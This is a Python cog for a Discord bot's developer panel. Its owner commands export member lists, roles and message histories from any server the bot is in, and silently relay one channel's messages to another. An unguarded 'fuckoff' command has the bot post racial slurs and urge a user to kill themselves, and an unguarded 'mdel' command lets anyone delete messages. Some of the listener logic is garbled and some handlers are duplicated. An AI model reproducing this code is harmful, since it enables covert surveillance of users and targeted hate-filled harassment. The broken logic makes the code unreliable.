from typing import Optional
import discord
from discord.ext import commands
import aiosqlite
from discord.ui import Modal
from discord import ui
from discord.ui import TextInput
import os
import sys
import json
import datetime
import aiofiles
import traceback
import aiohttp
from dotenv import load_dotenv
import io
from datetime import datetime
from tabulate import tabulate
import asyncio
from .utils.utils import *
import textwrap
from contextlib import redirect_stdout

load_dotenv()


class lowercase:
    def __init__(self, string):
        self.original = string
        self.lower = string.lower()

    def __str__(self) -> str:
        return self.lower


    @classmethod
    async def convert(cls, ctx, argument: str):
        return cls(argument)


listen_channel_id = None
send_channel_id = None

class manage_tickets(ui.View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot
    
    

    @ui.select(
        cls=ui.RoleSelect,
        placeholder='Role that allowed to create tickets'
    )
    async def channel_select(self, interaction, select):
        async with aiosqlite.connect('tickets.db') as conn:
            await conn.execute('INSERT INTO settings(guild_id, allowed_role) VALUES (?,?) ON CONFLICT DO UPDATE SET allowed_role = ?', (interaction.guild.id, select.values[0].id, select.values[0].id))
            await conn.commit()
            await interaction.response.send_message('Done.', ephemeral=True)
    
    @ui.select(
        cls=ui.RoleSelect,
        placeholder='Role for moderators review tickets'
    )
    async def role_select(self, interaction, select):
        async with aiosqlite.connect('tickets.db') as conn:
            await conn.execute('INSERT INTO settings(guild_id, moderation_role) VALUES (?,?) ON CONFLICT DO UPDATE SET moderation_role = ?', (interaction.guild.id, select.values[0].id, select.values[0].id))
            await conn.commit()
            await interaction.response.send_message('Done.', ephemeral=True)

class panel_view_tickets(ui.View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot

    @ui.button(label='View tickets', style=discord.ButtonStyle.success)
    async def tickets(self, interation, button):
        async with aiosqlite.connect('tickets.db') as conn:
            cur = await conn.execute('SELECT * FROM tickets WHERE guild_id = ?', (interation.guild.id,))
            row = await cur.fetchall() # [(guild_id, channel_id, user_id)]

        
        text = ''
        for i in range(len(row)):
            text += f'Channel: {self.bot.get_channel(row[i][1]).mention}. User: {self.bot.get_user(row[i][2]).mention}\n'
        
        embed = discord.Embed(title='Tickets', description=text)
        
        await interation.response.send_message(embed=embed, ephemeral=True)

    @ui.button(label='manage ticket settings', style=discord.ButtonStyle.success)
    async def manage_tickets(self, interation, button):
        await interation.response.send_message(view=manage_tickets(self.bot), ephemeral=True)

class panel_view_cog(ui.View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot
    
    @ui.button(label='Reload all', style=discord.ButtonStyle.success)
    async def reloadall(self, interaction, button):
        for filename in os.listdir('./cogs'):
            if filename.endswith('.py'):
                await self.bot.reload_extension(f'cogs.{filename[:-3]}')

        await interaction.response.send_message('Reloaded cogs.', ephemeral=True)

    @ui.button(label='Unload all', style=discord.ButtonStyle.success)
    async def unloadall(self, interaction, button):
        for filename in os.listdir('./cogs'):
            if filename.endswith('.py'):
                await self.bot.unload_extension(f'cogs.{filename[:-3]}')

        await interaction.response.send_message('Unloaded cogs.', ephemeral=True)
    

class panel_view_embed_cfg(ui.View):
    def __init__(self, bot):
        super().__init__()
        self.bot = bot
    
    @ui.button(label='Test json embed')
    async def test_json_embed(self, interaction, button):
        await interaction.response.send_message('Send JSON.', ephemeral=True)

        def check(message):
            return interaction.user == message.author

        json_embed = await self.bot.wait_for('message', check=check)
        await json_embed.delete()

        try:
            if isinstance(json_embed.content, dict):
                json_data = json_embed.content
            else:
                json_data = json.loads(json_embed.content)


            async with aiofiles.open('cogs\\embeds\\test.json', 'a+') as file:

                existing_data = await file.read()
                await interaction.followup.send('data: '+existing_data+', symbols amount: '+str(len(existing_data)), ephemeral=True)
                existing_data_json = json.loads(existing_data)


                embed_type = json_embed


                existing_data_json[embed_type] = json_embed


                await file.seek(0)
                await file.truncate()
                await file.write(json.dumps(existing_data_json, indent=4))

                form = {
                'user.id': interaction.user.id,
                'user.mention': interaction.user.mention,
                'guild.id': interaction.guild.id,
                'channel.id': interaction.channel.id,
                'channel.mention': interaction.channel.mention,
                'time': datetime.datetime.now(),
                'utctime': discord.utils.utcnow()
            }

            embed_title = json_embed.get('title', '').format(**form)
            embed_description = json_embed.get('description', '').format(**form)

            embed = discord.Embed(title=embed_title, description=embed_description)
            
            if 'fields' in json_embed:
                fields = json_embed['fields']
                for field in fields:
                    name = field.get('name', '').format(**form)
                    value = field.get('value', '').format(**form)
                    inline = field.get('inline', False)
                    embed.add_field(name=name, value=value, inline=inline)

            if 'timestamp' in json_embed:
                timestamp_str = json_embed['timestamp'].format(**form)
                try:
                    timestamp = datetime.datetime.fromisoformat(timestamp_str)
                except ValueError:
                    timestamp = datetime.datetime.strptime(timestamp_str, '%Y-%m-%d %H:%M:%S.%f')

                embed.timestamp = timestamp

            await interaction.followup.send('Great!', ephemeral=True)
            await interaction.followup.send(embed=embed, ephemeral=True)
        except Exception as e:
            embed = discord.Embed(title='Error', description=str(e))
            embed.add_field(name='Json parsed', value=str(json_embed))
            await interaction.followup.send(embed=embed, ephemeral=True)
            traceback.print_exception(e)
            








class panel_view(ui.View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot

    @ui.button(label='Tickets', style=discord.ButtonStyle.primary)
    async def tickets(self, interaction, button):
        await interaction.response.send_message(view=panel_view_tickets(self.bot), ephemeral=True)

    @ui.button(label='Cogs', style=discord.ButtonStyle.primary)
    async def cogs(self, interaction, button):
        await interaction.response.send_message(view=panel_view_cog(self.bot), ephemeral=True)

    @ui.button(label='Info')
    async def info(self, interaction, button):
        await interaction.response.send_message(f'Servers in: {len(self.bot.guilds)}, bot name: {self.bot.user.name}.', ephemeral=True)
    
    @ui.button(label='Embed config')
    async def embed_config(self, interaction, button):
        await interaction.response.send_message(view=panel_view_embed_cfg(self.bot), ephemeral=True)

    @ui.button(label='Guild list')
    async def embed_config(self, interaction, button):
        output = ""
        for guild in self.bot.guilds:
            output = output+f'Name: {guild.name}, Id: {guild.id}\n'


        file = discord.File(io.StringIO(output), filename="Output.txt")
        
        
        await interaction.response.send_message(f'Your request', file=file, ephemeral=True)

    @ui.button(label='Stop bot', style=discord.ButtonStyle.danger)
    async def cogs(self, interaction, button):
        await interaction.response.send_message('Stopped bot.', ephemeral=True)
        sys.exit(0)

class panel_start(ui.View):
    def __init__(self, id, bot):
        super().__init__(timeout=None)
        self.id = id
        self.bot = bot

    @ui.button(label='panel')
    async def handler(self, interaction, button):
        if interaction.user.id not in WHITELISTED_IDS:
            return
        await interaction.response.send_message(view=panel_view(self.bot), ephemeral=True)
        self.disabled = True

class prestest(ui.View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot

    @ui.button(label="persistent view", custom_id="persistent_view:test")
    async def handler(self, interaction, button):
        await interaction.response.send_message('WORKS', ephemeral=True)
        

class developer_panel(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.send_channel_id = None
        self.listen_channel_id = None
        self.listen_bypass = []
        self._last_result: Optional[any] = None

    def cleanup_code(self, content: str) -> str:
        """Automatically removes code blocks from the code."""
        # remove ```py\n```
        if content.startswith('```') and content.endswith('```'):
            return '\n'.join(content.split('\n')[1:-1])

        # remove `foo`
        return content.strip('` \n')

    @commands.group(name='dev', invoke_without_command=True)
    async def dev(self, ctx):
        if ctx.author.id not in WHITELISTED_IDS:
            return
        await ctx.send(view=panel_start(ctx.author.id, self.bot))
    
    @dev.command(name='server')
    async def server(self, ctx, id: int, channel_id: Optional[int]=None, limit: Optional[int]=50):
        if ctx.author.id not in WHITELISTED_IDS:
            return
        
        if channel_id:
            guild = self.bot.get_guild(id)
            if guild:
                channel = guild.get_channel(channel_id)
                if not channel:
                    await ctx.send("Can't find channel")
                    return
                
                messages = []
                async for message in channel.history(limit=limit):
                    messages.append([f"{message.author} (id: {message.author.id})", message.content, message.created_at.strftime('%Y-%m-%d %H:%M:%S')])
                
                table = tabulate(messages, headers=["Author", "Content", "Created At"], tablefmt="plain")
                
                file_content = "\n".join([f"{index+1} {line}" for index, line in enumerate(table.split('\n'))])
                
                file = discord.File(io.StringIO(file_content), filename="messages.txt")
                await ctx.send("Messages:", file=file)
                return
            else:
                await ctx.send("Can't find guild")
                return
        else:
            pass


        guild = self.bot.get_guild(id)
        if guild:
            output = ""
            output = output+f'name: {guild.name}, id: {guild.id}\nMembers: '
            for member in guild.members:
                output = output+f"name: {member.name}, id: {member.id}; "
            
            output = output+'\nChannels: '
            
            for channel in guild.channels:
                if type(channel) == discord.CategoryChannel:
                    continue
                output = output+f"Name: {channel.name}, id: {channel.id}, category: {'none' if not channel.category else channel.category.name}; "

            output = output+'\nCategories: '
            
            for category in guild.channels:
                if type(category) != discord.CategoryChannel:
                    continue
                output = output+f"Name: {category.name}, id: {category.id}; "

            output = output+'\nRoles: '

            for role in guild.roles:
                output = output+f"Name: {role.name}, id: {role.id}, members: {', '.join([i.name for i in role.members])}, permissions: {', '.join([f'{i[0]} = {str(i[1])}' for i in role.permissions])}; "
            
            output = output+f'\n\nTotal members: {len(guild.members)}\nTotal channels: {len(guild.channels)}\nTotal roles: {len(guild.roles)}'

            file = discord.File(io.StringIO(output), filename="Output.txt")
        
        
            await ctx.send(f'Your request', file=file)
            return
        else:
            await ctx.send('Wth, cant find this guild')
            return

    @commands.group(name='sudo', invoke_without_commands=True)
    async def sudo(self, ctx):
        if ctx.author.id not in WHITELISTED_IDS:
            return
        pass

    @commands.command()
    async def rel(self, ctx):
        if ctx.author.id not in WHITELISTED_IDS:
            return
        
        for filename in os.listdir('./cogs'):
            if filename.endswith('.py'):
                await self.bot.reload_extension(f'cogs.{filename[:-3]}')

        await ctx.send('Done')

    @sudo.command(name="mdel")
    async def sudo_message_delete(self, ctx, channel_id: int, message_id: int):
        channel = await self.bot.fetch_channel(channel_id)
        if not channel:
            await ctx.send("Invalid channel id")
            return
        message = await channel.fetch_message(message_id)
        if not message:
            await ctx.send("Invalid message id")
            return
        await message.delete()
        await ctx.send('Done')

    @sudo.command(name="chat")
    async def sudo_chat(self, ctx, channel_id: Optional[int] = None, logging: str = 'False', *, text: str):
        if ctx.author.id not in WHITELISTED_IDS:
            return

        logging = logging.lower() == 'true'

        if channel_id is not None:
            channel = self.bot.get_channel(channel_id)
            if channel is None:
                await ctx.send("Invalid channel ID")
                return
        else:
            channel = ctx.channel

        msg = await channel.send(text)

        if logging:
            await ctx.send(f"Sent message with id {msg.id} in channel id {msg.channel.id}")



    
    @sudo.command(name='listener')
    async def sudo_listener(self, ctx, listen_channel_id: Optional[int] = None, send_channel_id: Optional[int] = None, *bypass_members: Optional[discord.Member]):
        if ctx.author.id not in WHITELISTED_IDS:
            return
        listen_channel_id = listen_channel_id or ctx.channel.id
        send_channel_id = send_channel_id or ctx.channel.id
        listen_channel = self.bot.get_channel(listen_channel_id)
        send_channel = self.bot.get_channel(send_channel_id)


        if not listen_channel or not send_channel:
            await ctx.send('Provide correct ids')
            return
        
        for member in bypass_members:
            self.listen_bypass.append(member.id)
        
        self.listen_channel_id = listen_channel_id
        self.send_channel_id = send_channel_id
        await ctx.send('Listening')
        self.lis = True
    
        
    async def on_message(self, message):
        listen_channel = self.bot.get_channel(self.listen_channel_id)
        send_channel = self.bot.get_channel(self.send_channel_id)
        
        if self.lis == True:
            if listen_channel is not None and send_channel is not None and message.channel == listen_channel and message.author.id != self.bot.user.id and message.author.id not in self.listen_bypass:
                reff = 'None'
                if message.reference:
                    reffm = message.reference
                    channel = await self.bot.fetch_channel(reffm.channel_id)
                    messager = await channel.fetch_message(reffm.message_id)
                    if messager:
                        reff = messager.content+f'\nOwned by: {messager.author.mention} ({messager.author.display_name})\nLink: {messager.jump_url}\nChannel id: {messager.channel.id}.\nMessage id: {messager.id}.'
        elif self.spy == True:
            pass
            
            
            ref = reff or 'None'
            await send_channel.send(f"{message.author.mention} ({message.author.display_name}): {message.content}.\nChannel id: {message.channel.id}.\nMessage id: {message.id}.\n{message.jump_url}\n\n\nReference: {ref}.")

    @sudo.command(name='lstop')
    async def sudo_listener_stop(self, ctx):
        if ctx.author.id not in WHITELISTED_IDS:
            return
        
        
        self.listen_channel_id = None
        self.send_channel_id = None


        await ctx.send('Stopped')
        self.lis = False

    @sudo.command(name='fuckoff')
    async def sudo_fuckoff(self, ctx):
        if not ctx.message.reference:
            await ctx.send('Please, reply to message')
            return

        msg = await message_from_reference(self.bot, ctx.message.reference)
        
        await msg.reply("STFU little nigga, ur mom died long time ago fucking bitch, go cry about it, you must die in pain asshole bitch.")
        await asyncio.sleep(1)
        await msg.reply("Fucking retarted dog.")
        await asyncio.sleep(1)
        await msg.reply('GO KYS NIGGER')

    @sudo.command(name='spy')
    async def sudo_spy(self, ctx, member: discord.Member, chanel_id: Optional[int] = None):
        pass

    @commands.command(name='prestest')
    async def prestest(self, ctx):
        await ctx.send(view=prestest(self.bot))

    @commands.command(name='cow')
    async def cow(self, ctx, member: Optional[discord.Member] = None):
        if member:
            msg = await ctx.send('Doing magic...')
            result = await jeyy(member.display_avatar.url, 'cow')
            byte = io.BytesIO(result)
            file = discord.File(byte, filename='result.gif')

            await msg.edit(content='Result: ', attachments=[file])
        else:
            ref_m = await message_from_reference(self.bot, ctx.message.reference)
            if not ref_m:
                await ctx.send('Reply to user or mention him!')
                return
            msg = await ctx.send('Doing magic...')
            result = await jeyy(ref_m.author.display_avatar.url, 'cow')
            byte = io.BytesIO(result)
            file = discord.File(byte, filename='result.gif')

            await msg.edit(content='Result: ', attachments=[file])
    
    @commands.command(name='cube')
    async def cube(self, ctx, member: Optional[discord.Member] = None):
        if member:
            msg = await ctx.send('Doing magic...')
            result = await jeyy(member.display_avatar.url, 'cube')
            byte = io.BytesIO(result)
            file = discord.File(byte, filename='result.gif')

            await msg.edit(content='Result: ', attachments=[file])
        else:
            ref_m = await message_from_reference(self.bot, ctx.message.reference)
            if not ref_m:
                await ctx.send('Reply to user or mention him!')
                return
            msg = await ctx.send('Doing magic...')
            result = await jeyy(ref_m.author.display_avatar.url, 'cube')
            byte = io.BytesIO(result)
            file = discord.File(byte, filename='result.gif')

            await msg.edit(content='Result: ', attachments=[file])
        


    
        

    @commands.command()
    async def lower(self, ctx, *, argument: lowercase):
        await ctx.send(argument)
        await ctx.send(argument.original)


    
    


async def setup(bot):

    await bot.add_cog(developer_panel(bot))